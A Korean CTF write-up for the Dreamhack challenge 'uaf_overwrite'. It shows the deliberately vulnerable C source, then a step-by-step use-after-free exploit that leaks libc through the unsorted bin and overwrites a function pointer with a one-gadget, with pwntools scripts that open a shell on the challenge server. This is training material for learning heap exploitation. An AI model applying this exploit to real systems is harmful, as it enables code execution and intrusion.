## uaf_overwrite
---

```c
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;
  
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}
```

<br><br>

## Solution (강의)
---

```console
pwndbg> shell checksec uaf_overwrite
[*] '/home/index/uaf/uaf_overwrite'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

<br>

모든 보호기법이 적용되어 있다.

코드를 보면 강의에서 본 것과 똑같이 구조체 2개의 크기가 같다.

따라서 UAF 취약점이 발생하게 되는데, 문제는 함수 포인터에 시스템 함수를 어떻게 넣는지 이다.

<br>

여기까진 OK

값을 어떻게 넣는지 모르겠어서 강의를 보고 정리.

먼저 라이브러리 주소를 릭을 해야 하는데, 어떻게 주소 값을 leak 할 수 있는지 모르겠다.

왜냐하면 취약점이 UAF 밖에 없기 때문에 강의를 보았는데, unsorted bin 특징을 이용한다고 한다.

<br>

unsorted bin attack --> <a href="https://www.lazenca.net/pages/viewpage.action?pageId=1148135">lazenca.net/pages/viewpage.action?pageId=1148135</a>

<br>

Unsorted bin에 처음 연결되는 청크는 libc의 특정 주소와 이중 원형 연결 리스트를 형성한다.

즉, 처음 unsorted bin에 연결되는 청크의 fd와 bk에는 libc 내부의 주소가 쓰인다.

unsorted bin에 연결된 청크를 재할당하고, fd나 bk의 값을 읽으면 libc가 매핑된 주소를 계산할 수 있다.

<br>

malloc으로 할당받으면 tcache와 bin에 비슷한 크기의 chunk가 있는지 확인한다.

여기서 tcache는 0x410 이상의 chunk에 대해서는 관리하지 않고, 이하의 chunk에 대해서만 tcache에 삽입된다.

따라서 custom_func에서 malloc의 크기값을 0x410보다 크게 준다면, 해제를 했을 때 top chunk가 아니라면 unsorted bins에 연결될 것이다.

<br>

여기서 해제할 청크가 top chunk와 맞닿게 되면 병합이 된다고 한다.

그래서 청크 2개를 할당해준 뒤,  처음 할당한 청크를 해제해주면 top chunk가 해제가 된다.

<br>

libc를 leak하게 된다면 이제 Robot->fptr에 one gadget을 덮어씌우면 된다.

human과 robot의 구조체가 동일하여 chunk 영역이 같으므로 human의 age 값과 robot의 fptr 부분이 같다.

따라서 age에 onegadget을 넣어준다면 fptr 함수 포인터를 호출할 때 셸이 흭득될 것이다.

<br>

솔직히 아직까지 잘 모르겠다.. 풀이와 같이 살펴보았다. 풀이가 굉장히 친절하고 좋았음.

풀이 : https://wyv3rn.tistory.com/72

<br>

강의처럼 입력값을 먼저 주고 난 뒤, 힙 영역을 확인해보았다. (1280, AAAA, -1)

<br>

![image](https://user-images.githubusercontent.com/52172169/187615448-649edf80-751c-47da-b027-deba5d2a5a6f.png)

<br>

2번째 부분이 내가 입력한 값이 있는 chunk 영역이다.

이 부분이 ```custom[0]```이다.

<br>

![image](https://user-images.githubusercontent.com/52172169/187615663-30948f64-3209-421e-8b9c-881ca4107738.png)

<br>

다시 입력을 해주었다. (1280, AAAA, 0)

이렇게 입력을 해주면 내가 처음 할당해준 영역(```custom[0]```)이 free가 되는데, top chunk가 아니므로 unsorted bin에 연결이 된다.

따라서 나중에 재할당 될 때, 여기에 bk와 fd 값에 libc의 내부 주소가 저장된다.

이 값을 읽어줘야 한다.

<br>

![image](https://user-images.githubusercontent.com/52172169/187616375-6e3c77c1-799b-4622-94cf-1a509b8ae53f.png)

<br>

확인해보면 먼저 top chunk 값이 할당된 size인 0x511만큼 올랐고, 첫 번째 chunk 주소에서 0x511을 더해주면 두 번째 영역의 chunk 주소 -1 값이 나온다.

여기에도 역시 내가 입력한 AAAA 값이 저장되어 있다.

<br>

![image](https://user-images.githubusercontent.com/52172169/187616657-0b1cfb4a-d1eb-4e76-9f47-b4f928ee6085.png)

<br>

그래서 malloc을 한 직 후 브레이크 포인트를 걸어주면 아래와 같이 볼 수 있다.

<br>

![image](https://user-images.githubusercontent.com/52172169/187626347-e2e40789-e4a3-4284-bb49-899400ed85f3.png)

<br>

fd와 bk 값에 libc의 주소가 저장되었고, 이제 여기다 입력값을 B를 넣어주면 어떻게 되는지 확인해본다.

<br>

![image](https://user-images.githubusercontent.com/52172169/187626668-f6aa248b-bcbb-4995-837d-3ee70878df7b.png)

<br>

fd나 bk 둘 중에 내 입력값인 B가 끝부분에 덮어졌다.

이 값이 출력이 되는 것이다.

근데 강의와는 다르게 이 주소 값을 바로 알아낼 수 있는데, 2개의 chunk를 만든 뒤, 첫 번째 chunk를 free 하면 unsorted bin에 들어갈 것이다.

다시 malloc으로 재할당 해주면 libc 주소가 저장되는데, 입력값을 7바이트를 준다면?

AAAAAAA\n이 되어 libc의 주소가 덮어씌어지는 동시에 널바이트 만나기 전까지 옆에 있던 libc의 주소까지 출력하고 널 바이트를 만나 출력이 멈춘다.

<br>

![image](https://user-images.githubusercontent.com/52172169/187634023-4fe1e626-1e76-4ea6-80a5-cea994362134.png)

<br>

위의 상태에서 AAAAAAA를 입력해주면 아래와 같이 변한다.

<br>

![image](https://user-images.githubusercontent.com/52172169/187634145-64816379-094a-4d1f-b23b-8590e73ee157.png)

<br>

![image](https://user-images.githubusercontent.com/52172169/187634230-65aed219-efc3-4eb5-92e7-eb90356975f0.png)

<br>

pwntools로 확인해보면 주소가 나올 것이다.

<br>

```python
from pwn import *

# p = remote('host3.dreamhack.games',)
p = process('./uaf_overwrite')

libc = ELF('./libc-2.27.so')
e = ELF('./uaf_overwrite')

# first chunk
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'1280')
p.sendlineafter(b': ',b'A')
p.sendlineafter(b': ',b'-1') # non-free

# second chunk and free first chunk
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'1280')
p.sendlineafter(b': ',b'A')
p.sendlineafter(b': ',b'0')

# leak
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'1280')
p.sendlineafter(b': ',b'AAAAAAA')
p.recvline()
print(p.recvline())
```

<br>

흠.. 풀이를 보고 살짝 수정을 해서 풀었는데 시행착오가 있었다.

먼저 leak 한 주소 값이 main_arena과의 오프셋이 로컬 환경과 서버 환경과 일치하는지였다.

이 부분은 결론적으로는 로컬에서 구한 오프셋과 동일한 거 같은데, 이 오프셋은 내가 chunk 페이로드를 얼마나 주는지, 무슨 값으로 주는지에 따라 달라진다.

내 코드로는 오프셋이 96이 나온다.

<br>

따라서 libc의 베이스 주소는 leak한 주소에서 main_arena와의 offset이 몇인지 구하고, main_arena와 libc와의 오프셋을 구하면 다음과 같은 식이 성립한다.

main_arena와 libc와의 오프셋 값은 main_arena가 ```__malloc_hook + 0x10```에 위치한다고 하므로 이를 이용해서 구하면 된다.

```libc_base = leak - (libc.symbols['__malloc_hook'] + 0x10) - main_arena_offset```

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games', 22807)
#p = process('./uaf_overwrite')
libc = ELF('./libc-2.27.so')

# first chunk
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'1280')
p.sendlineafter(b': ',b'A')
p.sendlineafter(b': ',b'-1') # non-free

# second chunk
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'1280')
p.sendlineafter(b': ',b'A')
p.sendlineafter(b': ',b'0')

# leak
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'1280')
p.sendlineafter(b': ',b'AAAAAAA')
p.recvline()

main_arena_off = u64(p.recvline()[:-1]+ b'\x00\x00')
print("main_arena_offset: ", hex(main_arena_off))
p.sendlineafter(b': ', b'-1')

libc_main_arena_offset = libc.symbols['__malloc_hook'] + 0x10 # 0x3ebc40

libc_base = main_arena_off - libc_main_arena_offset - 0x60 # - 96

print("libc: ", hex(libc_base))

# overwrite Robot.fptr by onegadget 
onegadget = [0x4f3d5, 0x4f432, 0x10a41c]

payload = libc_base + 0x10a41c

# send payload
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'1')
p.sendlineafter(b': ', bytes(str(payload),'latin-1'))

# get shell
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'1')

p.interactive()
```
